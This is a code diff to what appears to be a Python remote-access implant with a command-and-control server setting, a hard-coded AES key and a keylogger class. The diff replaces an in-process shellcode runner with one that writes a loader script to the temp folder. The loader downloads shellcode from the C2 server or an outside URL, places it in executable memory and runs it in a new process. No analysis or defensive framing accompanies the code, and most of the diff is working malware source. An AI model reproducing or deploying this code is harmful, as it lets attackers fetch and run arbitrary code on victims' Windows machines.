@@ -99,7 +99,7 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.16.78"
+        self.C2_SERVER = "https://192.168.147.1"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -1082,113 +1082,68 @@ class Keylogger:
 # ======================
 # Shellcode-Runner
 # ======================
-if platform.system == 'Windows':
+if platform.system() == 'Windows':
     class ShellcodeRunner:
-        # Initialize Windows DLL
-        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        
-        # Define Windows constants
-        MEM_COMMIT = 0x00001000
-        MEM_RESERVE = 0x00002000
-        PAGE_EXECUTE_READWRITE = 0x40
-        INFINITE = 0xFFFFFFFF
-
-        # Set up proper function prototypes
-        kernel32.VirtualAlloc.restype = wintypes.LPVOID
-        kernel32.VirtualAlloc.argtypes = [
-            wintypes.LPVOID,    # lpAddress
-            ctypes.c_size_t,    # dwSize (using c_size_t instead of SIZE_T)
-            wintypes.DWORD,     # flAllocationType
-            wintypes.DWORD      # flProtect
-        ]
-        
-        kernel32.CreateThread.restype = wintypes.HANDLE
-        kernel32.CreateThread.argtypes = [
-            wintypes.LPVOID,    # lpThreadAttributes
-            ctypes.c_size_t,    # dwStackSize
-            wintypes.LPVOID,    # lpStartAddress
-            wintypes.LPVOID,    # lpParameter
-            wintypes.DWORD,     # dwCreationFlags
-            wintypes.LPDWORD    # lpThreadId
-        ]
-        
-        kernel32.WaitForSingleObject.restype = wintypes.DWORD
-        kernel32.WaitForSingleObject.argtypes = [
-            wintypes.HANDLE,    # hHandle
-            wintypes.DWORD      # dwMilliseconds
-        ]
-
-        @staticmethod
-        def _worker(shellcode_bytes):
-        
-            try:
-                # Allocate executable memory
-                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                    None,
-                    len(shellcode_bytes),
-                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
-                )
-                
-                if not ptr:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Copy shellcode to allocated memory
-                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-                
-                # Create and execute thread
-                thread = ShellcodeRunner.kernel32.CreateThread(
-                    None,
-                    0,
-                    ptr,
-                    None,
-                    0,
-                    None
-                )
-                
-                if not thread:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Wait for thread to complete
-                ShellcodeRunner.kernel32.WaitForSingleObject(thread, ShellcodeRunner.INFINITE)
-                
-            except Exception as e:
-                print(f"Error in worker: {e}", file=sys.stderr)
-                sys.exit(1)
-
         @staticmethod
         def execute(shellcode_bytes):
             try:
-                # Direct execution in current process (more reliable in headless)
-                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                    None,
-                    len(shellcode_bytes),
-                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
+                # Create a temporary Python script file with the shellcode loader
+                temp_dir = tempfile.gettempdir()
+                script_path = os.path.join(temp_dir, "sc_loader.py")
+                
+                # The loader script content (exactly as you provided)
+                loader_script = """import ctypes as mill
+import sys, requests as r
+
+def mi(little):   
+    try:
+        bmx = r.get(little).content
+    except r.exceptions.RequestException as e:
+        print(f"Error downloading file: {e}")
+        return
+
+    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
+    mill.windll.kernel32.CreateThread.argtypes = (
+        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int)
+    )
+
+    spc = mill.windll.kernel32.VirtualAlloc(
+        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40)
+    )
+    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
+    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
+    hndl = mill.windll.kernel32.CreateThread(
+        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
+        mill.pointer(mill.c_int(0))
+    )
+
+    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
+
+if __name__ == "__main__":
+    little = sys.argv[1] if len(sys.argv) > 1 else "http://windcorp.eu/s.txt"
+    mi(little)
+"""
+                # Write the loader script to a temporary file
+                with open(script_path, 'w') as f:
+                    f.write(loader_script)
+                
+                # Create a URL to serve the shellcode
+                # This could be your C2 server or a temporary HTTP server
+                shellcode_url = f"{self.config.C2_SERVER}/shellcode.bin"
+                
+                # Start a new Python process with the loader script
+                python_exe = sys.executable
+                process = subprocess.Popen(
+                    [python_exe, script_path, shellcode_url],
+                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
                 )
                 
-                if not ptr:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-                
-                # Create thread with explicit stack size
-                thread = ShellcodeRunner.kernel32.CreateThread(
-                    None,
-                    0,  # Default stack size
-                    ptr,
-                    None,
-                    0,  # Start immediately
-                    None
-                )
-                
-                if not thread:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Don't wait for completion in headless mode
                 return {
                     'status': 'success',
-                    'message': 'Shellcode executed asynchronously'
+                    'message': f'Shellcode loader started in new process (PID: {process.pid})',
+                    'pid': process.pid
                 }
                 
             except Exception as e:
@@ -1196,7 +1151,8 @@ if platform.system == 'Windows':
                     'status': 'error',
                     'message': str(e)
                 }
-
+            
+            
 # ======================
 # WebSocket Client
 # ======================
